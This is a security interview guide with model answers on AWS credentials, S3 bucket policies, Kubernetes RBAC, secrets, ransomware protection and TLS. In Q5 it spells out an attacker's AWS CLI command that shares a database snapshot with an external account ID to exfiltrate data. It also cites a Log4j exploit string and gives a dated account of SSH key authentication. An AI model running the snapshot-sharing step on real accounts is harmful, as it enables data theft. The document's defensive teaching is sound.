# 🔒 Security — Scenario-Based Interview Questions

**Q1. [L1] A developer accidentally pushed an AWS Access Key and Secret Key to a public GitHub repository. What steps do you take?**

> *What the interviewer is testing:* Incident response workflow for leaked credentials, containment vs. investigation.

**Answer:**
This is a critical security incident. The immediate priority is **Containment**:
1. Go directly to AWS IAM and **Deactivate** (do not immediately delete) the leaked access key. Deactivating stops any further use while preserving it for forensics.
2. Check AWS CloudTrail immediately for any actions performed by that specific access key since the time of the leak. Look for EC2 instance spawning (crypto-mining), IAM privilege escalation, or data exfiltration.
3. Review the code repository and rewrite the Git history to remove the credentials permanently, then force push the clean history.
4. If the key was used maliciously, initiate your organization's Incident Response Plan (e.g., isolating compromised instances, rotating related secrets).

---

**Q2. [L2] Your security scanner reports that a Docker image you deploy has 5 "Critical" vulnerabilities inside a system library. However, your application doesn't even use that library. How do you handle this?**

> *What the interviewer is testing:* Vulnerability management, distroless images, practical risk assessment.

**Answer:**
A critical CVE in an unused library still poses a risk if an attacker finds a way to execute it (e.g., via a remote code execution exploit in your main app that invokes the system shell), but it's a lower priority than an exploit in your direct code.

The SRE/DevSecOps approach is:
1. **Short term:** Suppress the finding mathematically showing it's unreachable, or update the base image if a patch is available.
2. **Long term (Better):** Rebuild the Docker image using a **Distroless** base image or `scratch`. Distroless images contain only your application and its direct runtime dependencies (no package managers, no shells, no unnecessary system libraries). This drastically reduces the attack surface and eliminates the vast majority of scanner noise.

---

**Q3. [L2] You need to give an EC2 instance access to read from an S3 bucket. A junior engineer suggests creating an IAM User, generating access keys, and hardcoding them into the app. Why is this bad, and what is the correct way?**

> *What the interviewer is testing:* IAM Roles, temporary credentials, avoiding static secrets.

**Answer:**
Hardcoding static AWS Access Keys is highly insecure because they can be easily leaked in source code, logs, or machine images, and they do not automatically rotate.
The correct way is to use an **IAM Role for EC2**:
1. Create an IAM Policy that grants exactly `s3:GetObject` on the specific bucket ARN.
2. Attach this policy to an IAM Role.
3. Attach the IAM Role to the EC2 instance via an Instance Profile.
4. The application uses the AWS SDK, which automatically queries the EC2 Metadata Service (`169.254.169.254`) to fetch temporary, automatically rotating, short-lived STS credentials to access S3 seamlessly. 

---

**Q4. [L3] Your company wants to ensure that a specific S3 bucket containing PII can *only* be accessed from a designated VPC, even by AWS administrators with Full S3 permissions. How do you enforce this?**

> *What the interviewer is testing:* S3 Bucket Policies, VPC Endpoints, defense in depth.

**Answer:**
IAM policies dictate *who* can access a resource, but an **S3 Bucket Policy** dictates the conditions under which the bucket itself accepts requests, overriding IAM permissions.

To enforce this, I would:
1. Create an S3 VPC Gateway Endpoint (or Interface Endpoint) in the designated VPC.
2. Apply a strict Bucket Policy to the S3 bucket that uses a `Deny` statement to block all `s3:*` actions if the `aws:sourceVpce` condition does NOT match the ID of the specific VPC Endpoint.
Because explicit Denys always override Allows in AWS IAM evaluation, even a user with `AdministratorAccess` will be blocked from accessing the bucket if they try to call the S3 API from the public internet or another VPC.

---

**Q5. [L2] An attacker gains SSH access to a web server running in AWS. The web server has an IAM Role attached that allows taking EC2 snapshots. The attacker uses this role to snapshot your production database server, but they can't download it from AWS because the snapshot is internal. How might they still steal your data?**

> *What the interviewer is testing:* Understanding of snapshot sharing, privilege escalation, lateral movement.

**Answer:**
Once an attacker can create an EBS snapshot, they have effectively bypassed all OS-level database security.
To steal the data, the attacker doesn't need to download the snapshot directly. Instead, they can:
1. Share the snapshot with their own external AWS Account ID using the AWS CLI: `aws ec2 modify-snapshot-attribute --snapshot-id snap-1234 --create-volume-permission "Add=[{UserId=ATTACKER_ACCOUNT_ID}]"`.
2. Once shared, they log into their own AWS account, create an EBS volume from the snapshot, attach it to their own EC2 instance, mount the filesystem, and freely copy all the unencrypted database files.
*Mitigation:* Use AWS KMS Customer Managed Keys (CMKs) to encrypt the root volumes; attackers cannot share snapshots encrypted with a KMS key they don't have policy access to.

---

**Q6. [L1] Explain the principle of Least Privilege.**

> *What the interviewer is testing:* Core security concepts.

**Answer:**
The Principle of Least Privilege states that a user, application, or system process should be given the bare minimum permissions necessary to perform its required function, and absolutely nothing more.
For example, if an application only needs to read objects from an S3 bucket, it should be granted `s3:GetObject` on that specific bucket ARN, rather than `s3:*` (full S3 access) or `*.*` (admin access). This minimizes the "blast radius" if the application or identity is ever compromised.

---

**Q7. [L2] Your team uses Kubernetes. Currently, all developers have `cluster-admin` access. You need to restrict them so they can only manage deployments in their specific namespace, without affecting others. How do you implement this?**

> *What the interviewer is testing:* Kubernetes RBAC (Role-Based Access Control).

**Answer:**
I would implement Kubernetes RBAC by combining generic Roles with specific RoleBindings.
1. Create a `Role` (namespaced) that defines the allowed actions, e.g., `create`, `get`, `update`, `delete` on resources like `pods`, `deployments`, and `services`.
2. Do not use a `ClusterRole` (unless you want to define a global template to be bound locally). A `ClusterRole` applies globally, whereas a `Role` is restricted to a single namespace.
3. Create a `RoleBinding` in the developer's specific namespace (e.g., `namespace-frontend`). This binds the `Role` permissions to the developer's user identity or Azure AD/OIDC group.
Now, the developer has full control inside `namespace-frontend`, but if they try to run `kubectl delete pod` in the `kube-system` namespace, the Kubernetes API server will reject it with a 403 Forbidden.

---

**Q8. [L3] During an audit, you discover that database passwords are being passed to Docker containers as plaintext Environment Variables via the orchestration tool. You are asked to implement a secure Secret Management system. Explain the architecture.**

> *What the interviewer is testing:* Vault/Secrets Manager architectures, sidecar pattern, memory-only secrets.

**Answer:**
Passing secrets as plain environment variables is a risk because they are visible in process trees (`/proc/pid/environ`), orchestration dashboards, and crash dumps.

A hardened architecture involves a centralized vault (like HashiCorp Vault or AWS Secrets Manager) and a **Sidecar/Init Container Pattern**:
1. The application's pod starts an Init Container.
2. The Init Container authenticates to the Vault using the Pod's Service Account identity (e.g., K8s JWT token via AWS IAM Roles for Service Accounts - IRSA).
3. It fetches the secret dynamically from the Vault.
4. It writes the secret to a shared memory-backed `tmpfs` volume (a RAM disk that never touches physical storage).
5. The main application container starts, reads the secret from the memory volume directly, and the `tmpfs` is wiped the moment the pod is destroyed.

---

**Q9. [L2] A compliance standard requires that all data at rest in your RDS databases be encrypted. How does AWS RDS encryption work, and what is transparent data encryption (TDE)?**

> *What the interviewer is testing:* Disk-level encryption vs. database-level encryption (KMS vs TDE).

**Answer:**
AWS RDS "Encryption at Rest" utilizes AWS KMS (Key Management Service). It operates at the underlying storage volume (EBS) level. When data is written to the disk, the hypervisor encrypts it; when read, it decrypts it. This protects against someone physically stealing the hard drive or gaining access to the raw EBS snapshots. However, any user with SQL access to the database queries the data in plaintext.

**TDE (Transparent Data Encryption)**, offered by engines like SQL Server and Oracle, encrypts the data at the database page/file level *before* it hits the disk.
For true end-to-end security involving PII, you must combine disk-level KMS with application-level or field-level encryption, where the application itself encrypts the SSN or credit card before inserting it, so even DB admins cannot run a `SELECT *` and see the plaintext.

---

**Q10. [L1] What is a WAF, and how does it differ from a standard Network Firewall?**

> *What the interviewer is testing:* OSI Layer 7 vs Layer 4 defense mechanisms.

**Answer:**
A standard Network Firewall (or AWS Security Group) operates at OSI Layers 3 & 4. It blocks IP addresses and network ports. It cannot see the *content* of the traffic. An attacker hitting an open port 443 with an SQL Injection attack walks right through a Network Firewall.

A **WAF (Web Application Firewall)** operates at OSI Layer 7. It inspects the actual HTTP requests and headers (GET payloads, POST bodies). IT mitigates OWASP Top 10 vulnerabilities by pattern-matching malicious signatures, such as SQL Injection (SQLi), Cross-Site Scripting (XSS), or aggressive botnet crawling, blocking them *before* they reach the application code.

---

**Q11. [L3] A critical vulnerability in a popular Java logging framework (like Log4j) is announced on a Friday night. It allows Remote Code Execution (RCE) via a simple HTTP header. You have 500 microservices. How do you respond systematically?**

> *What the interviewer is testing:* Zero-day incident response, mitigation hierarchy.

**Answer:**
I would execute a defense-in-depth response:
1. **Immediate Mitigation (Edge Filtering):** I cannot patch 500 services instantly. Immediately deploy a WAF rule (AWS WAF/Cloudflare) globally to block incoming HTTP requests containing the known malicious exploit strings (e.g., `${jndi:ldap...}`). This protects the perimeter instantly.
2. **Identification (Scanning):** Run an emergency vulnerability scan across all container registries and codebases using tools like Trivy or Snyk to identify exactly which of the 500 services actually use the vulnerable version of the library.
3. **Internal Mitigation (Egress Control):** The RCE requires the compromised server to make an outbound connection to the attacker's server to download the payload. Ensure strict Egress Network Policies / Security Groups are in place. If a backend service doesn't need the internet, block its outbound traffic.
4. **Remediation & Rollout (Patching):** Work with developer teams to upgrade the library in the identified services, build new images, and deploy them systematically over the weekend.

---

**Q12. [L2] What is cross-account IAM role assumption, and why is it considered safer than creating IAM users in every account?**

> *What the interviewer is testing:* STS AssumeRole, centralized identity management, reducing attack surface.

**Answer:**
If you have 10 AWS accounts (Dev, QA, Prod for various products), creating 10 individual IAM Users for an engineer means 10 sets of permanent access keys to manage, rotate, and potentially leak.

A safer architecture is a **Hub and Spoke** model using `sts:AssumeRole`.
1. The engineer has a single IAM User (or SSO identity) exclusively in a central "Identity Account".
2. In the "Prod Account", an IAM Role is created that trusts the Identity Account.
3. The engineer uses the AWS CLI/Console to run `AssumeRole`. AWS STS issues temporary, short-lived (e.g., 1 hour) credentials to act as that Role in the Prod Account.
This inherently forces credential expiration and allows security teams to manage all identities from a single pane of glass.

---

**Q13. [L1] How does asymmetric encryption (Public Key cryptography) work in the context of an SSH connection?**

> *What the interviewer is testing:* Public/Private key pairs, authentication basics.

**Answer:**
Asymmetric encryption uses two mathematically linked keys: a Public Key (which can be shared with anyone) and a Private Key (which must be kept completely secret by the user). Data encrypted by one can only be decrypted by the other.

When you SSH into a server:
1. You place your **Public Key** in your user's `~/.ssh/authorized_keys` file on the server.
2. When you attempt to connect, the server generates a random challenge message, encrypts it using your Public Key, and sends it back to your client.
3. Your SSH client automatically decrypts this challenge using your **Private Key**, and sends the decrypted result back to the server.
4. Because only your private key could have decrypted the challenge, the server mathematically verifies your identity and grants access.

---

**Q14. [L3] Your CI/CD pipeline builds a Docker image and pushes it to ECR. How do you ensure that only container images explicitly built and signed by your CI/CD pipeline can actually run in your Kubernetes production cluster?**

> *What the interviewer is testing:* Container signing, Admission Controllers, Supply Chain Security.

**Answer:**
To secure the software supply chain against image substitution or tampering, we must implement **Image Signing and Admission Control**.
1. **Signing:** During the CI/CD pipeline, after the image is built and vulnerability scanned successfully, we use a tool like **Cosign** or Docker Content Trust (Notary) to digitally sign the image hash using a private cryptographic key from our KMS. The signature is pushed to the registry alongside the image.
2. **Enforcement:** In the production Kubernetes cluster, we deploy an **Admission Controller** (like Kyverno or OPA Gatekeeper). When the API server receives a request to create a Pod, the admission controller intercepts it.
3. **Verification:** The admission controller pulls the signature from the registry and verifies it against our trusted Public Key before allowing the Pod to start. If developers try to `kubectl run` an unsigned image directly, K8s rejects it.

---

**Q15. [L2] Our company mandates MFA (Multi-Factor Authentication) for all AWS Console logins. However, developers are still using static AWS Access Keys in their local terminals which bypasses MFA. How do you enforce MFA for CLI access?**

> *What the interviewer is testing:* STS GetSessionToken, IAM condition keys for MFA.

**Answer:**
Static AWS CLI access keys are essentially single-factor authentication. To enforce MFA on the CLI:
1. Apply an **IAM Policy Condition** to the developers' IAM Group that explicitly denies all actions unless the `aws:MultiFactorAuthPresent` boolean is set to `true`.
2. The developers must now use the `aws sts get-session-token` command, passing in their MFA device serial number and the 6-digit code from their authenticator app.
3. STS returns a temporary Access Key, Secret Key, and Session Token. These temporary credentials carry the MFA claim, allowing the developer to bypass the IAM deny policy for the duration of the token (typically 8-12 hours). Tooling like AWS SSO v2 handles this seamlessly via browser popups.

---

**Q16. [L1] Explain the concept of a Bastion Host (Jump Box).**

> *What the interviewer is testing:* Network segmentation, secure remote access.

**Answer:**
A Bastion Host is a heavily fortified, purpose-built server exposed to the public internet (in a public subnet), designed specifically to act as a secure gateway to access servers in a private network.
Instead of exposing internal databases or application servers directly to the internet on port 22 (SSH), you place them in a private subnet with no public IPs.
Administrators first SSH into the Bastion Host. From the Bastion Host, they then SSH securely into the internal private servers. The Bastion Host acts as a single, easily monitorable, tightly controlled choke point for all administrative access. Modern clouds often replace traditional Bastions with managed services like AWS Systems Manager (SSM) Session Manager.

---

**Q17. [L3] An AWS S3 bucket holding company financial reports suffered a ransomware attack. An attacker gained access, enabled AWS KMS encryption using their own key (which they control), and locked out your access to read the files because you don't have access to their KMS key to decrypt it. How do you architect the bucket to prevent this entirely?**

> *What the interviewer is testing:* S3 Versioning, Object Lock, immutable backups, WORM.

**Answer:**
Standard S3 versioning is not enough here, as the attacker could maliciously encrypt the latest version *and* delete previous versions.

To mathematically prevent ransomware and ensure immutability, we must implement **S3 Object Lock in Compliance Mode**.
1. Enable S3 Versioning and Object Lock on bucket creation.
2. Configure a default retention period (e.g., 7 years) in **Compliance Mode**.
When a file is written under Compliance Mode, it becomes WORM (Write Once, Read Many). 
Absolutely *no one*, not even the AWS Account Root User, can delete or modify the object version until the retention period expires. If an attacker uploads an encrypted version over the file, the previous completely unencrypted version is perfectly preserved, locked, and fully recoverable because the attacker is physically blocked by the AWS control plane from deleting it.

---

**Q18. [L2] During a pentest, the testers found they could exploit a vulnerability in your Node.js app to read `/etc/passwd`. What OS-level container configuration should standardly prevent this kind of filesystem roaming?**

> *What the interviewer is testing:* Read-only root filesystems, container hardening.

**Answer:**
A fundamental tenant of container hardening is running the container with a **Read-Only Root Filesystem**.
In Kubernetes, this is achieved by setting `readOnlyRootFilesystem: true` in the pod's `securityContext`. In Docker, it's the `--read-only` flag.
When enabled, the application cannot overwrite binaries, modify `/etc/passwd`, or drop malicious payloads onto the disk during an exploit. Any directory the app legitimately needs to write to (like `/tmp` for caching) must be explicitly mounted as an ephemeral `emptyDir` or `tmpfs` volume, leaving the rest of the OS immutable and highly frustrating for attackers.

---

**Q19. [L2] Your security team mandates that AWS IAM passwords must be rotated every 90 days. Why is this considered an outdated practice for human users by NIST guidelines?**

> *What the interviewer is testing:* Modern password philosophy vs legacy compliance.

**Answer:**
Modern NIST (National Institute of Standards and Technology) guidelines advise *against* arbitrary periodic password rotation for human users.
Statistically, when forced to change passwords every 90 days, humans adopt poor, predictable behaviors to cope. They use patterns (e.g., `PasswordFall2023!`, `PasswordWinter2023!`), resulting in weaker overall security that attackers can easily guess.
The advised modern approach is:
1. Enforce strong, complex passwords or passphrases initially.
2. Enforce strict MFA (hardware tokens or authenticators).
3. Do not force rotation unless there is evidence of a breach or compromise.

---

**Q20. [L1] What is a Man-in-the-Middle (MITM) attack, and how does TLS prevent it?**

> *What the interviewer is testing:* HTTPS, Certificate Authorities, encryption in transit.

**Answer:**
A Man-in-the-Middle (MITM) attack occurs when an attacker secretly intercepts and relays communications between two parties who believe they are communicating directly (e.g., over public Wi-Fi).

TLS prevents this through **Authentication via Certificates**. 
When a browser connects to a server via HTTPS, the server presents a digital Certificate cryptographically signed by a trusted third-party Certificate Authority (CA) that the browser's OS pre-trusts.
The browser mathematically verifies the signature to guarantee the server is legitimately the owner of the domain (Authentication), and then safely negotiates a shared symmetric encryption key. The attacker cannot impersonate the server because they do not have the private key corresponding to the CA-signed certificate, making interception impossible.
